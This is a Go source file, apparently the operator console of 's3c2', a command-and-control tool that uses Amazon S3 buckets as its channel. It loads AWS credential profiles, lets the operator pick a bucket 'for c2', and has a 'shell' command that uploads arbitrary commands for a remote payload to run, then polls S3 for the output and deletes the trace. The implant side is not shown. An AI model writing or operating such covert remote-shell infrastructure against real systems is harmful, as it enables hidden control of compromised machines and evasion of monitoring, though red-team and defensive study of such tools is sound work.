package completion

import (
	"fmt"
	"io/ioutil"
	"os"
	"strings"
	"time"

	"github.com/grines/s3c2/internal/app/files"
	"github.com/grines/s3c2/internal/app/s3"
)

func Commands(line string) {
	switch {

	//Load aws profile from .aws/credentials
	case strings.HasPrefix(line, "token profile"):
		help := HelpText("profile ec2user us-east-1", "Profile is used to load a profile from ~/.aws/credentials.", "enabled")
		parse := ParseCMD(line, 4, help)
		if parse != nil {
			target = parse[2]
			region = parse[3]
			sess = getProfile(target, region)
		}

	case strings.HasPrefix(line, "get-caller-identity") && connected == true:
		help := HelpText("get-caller-identity", "GetSessionToken returns current token details.", "enabled")
		parse := ParseCMD(line, 1, help)
		if parse != nil {
			data := GetCallerIdentity(sess)
			fmt.Println(data)
		}

	case strings.HasPrefix(line, "list-buckets") && connected == true:
		help := HelpText("list-buckets", "list-buckets", "enabled")
		parse := ParseCMD(line, 1, help)
		if parse != nil {
			data := s3.ListBuckets(sess)
			fmt.Println(data)
		}

	case strings.HasPrefix(line, "bucket ") && connected == true:
		help := HelpText("Choose bucket for c2", "list-buckets", "enabled")
		parse := ParseCMD(line, 2, help)
		if parse != nil {
			bucket = parse[1]
		}

	case strings.HasPrefix(line, "shell ") && connected == true:
		parts := strings.Split(line, " ")
		cmd := parts[1:]
		cmds := strings.Join(cmd, " ")
		filedir := files.CreateCommand(cmds)
		s3.Upload(sess, filedir, bucket)

		// We check s3 for the output file from the payload
		timeout := time.After(10 * time.Second)
		ticker := time.Tick(500 * time.Millisecond)
		stop := false
		// Keep trying until we're timed out
		for {
			var out string
			select {
			// Got a timeout! set stop and break
			case <-timeout:
				fmt.Println("Command Timed Out")
				stop = true
				break
			// Got a tick, we should checking
			case <-ticker:
				out = s3.Read(sess, filedir, bucket)
				if out != "" || stop == true {
					break
				}
			}
			if stop == true || out != "" {
				fmt.Println(out)
				s3.DeleteItem(sess, bucket, filedir)
				break
			}
		}

	//Show command history
	case line == "history":
		dat, err := ioutil.ReadFile("/tmp/readline.tmp")
		if err != nil {
			break
		}
		fmt.Print(string(dat))

	//exit
	case line == "quit":
		connected = false

	//Default if no case
	default:
		cmdString := line
		if connected == false {
			fmt.Println("You are not connected to a profile.")
		}
		if cmdString == "exit" {
			os.Exit(1)
		}

	}
}
